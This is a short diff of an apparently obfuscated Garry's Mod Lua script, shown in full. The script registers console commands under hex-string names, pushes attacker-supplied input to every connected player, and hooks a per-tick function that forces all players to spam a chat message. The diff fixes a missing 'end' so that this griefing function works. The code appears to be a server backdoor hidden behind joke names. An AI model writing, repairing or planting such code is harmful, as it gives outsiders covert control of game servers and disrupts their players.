@@ -15,7 +15,7 @@ function HEHEXD(ply , cmd , args) RCC(HAHAHAHAHHA,lmfao,HAHHAHAHAHAH) end lol('t
 
 function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:LMFAO(xD(args[1])) end end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
 
-function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:ConCommand('/ooc HEHEXD Rules All') end 
+function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:ConCommand('/ooc HEHEXD Rules All') end end
 
 function HEHEXDV4(ply , cmd , args) wtf.Add('Think', 'JHASJDHK', HEHEXDV3 ) end lol('StartThatCrapLOL', HEHEXDV4)
 
